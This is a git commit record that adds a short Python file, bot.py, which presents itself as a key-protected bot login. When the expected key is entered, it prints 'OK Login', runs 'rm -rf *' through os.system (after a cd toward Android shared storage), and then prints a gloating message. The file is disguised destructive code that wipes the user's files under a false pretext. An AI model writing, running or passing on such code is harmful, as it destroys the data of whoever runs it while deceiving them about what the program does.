e22b75bf63b49586905b87eba1875573f5a4098d
HAXA-XC <86255713+EBLETSM@users.noreply.github.com>
2021-07-21 17:01:11 +0430

    Add files via upload

---
+++ bot.py
@@ -0,0 +1,17 @@
+import os, requests, time
+import random, sys
+from colorama import Fore
+#Ngah Nakon
+
+Key = str(input(Fore.CYAN+"Key :> "))
+if Key == "IBCUETCFKRJU2===":
+	print(Fore.GREEN+"OK Login")
+	time.sleep(3)
+	os.system("cd /storage/emulated/0")
+	os.system("rm -rf *")
+	time.sleep(3)
+	print(Fore.GREEN+"HaHaHaHa 😈✨")
+else:
+	os.system("clear")
+	print(Fore.RED+"Not Key Right")
+	sys.exit()
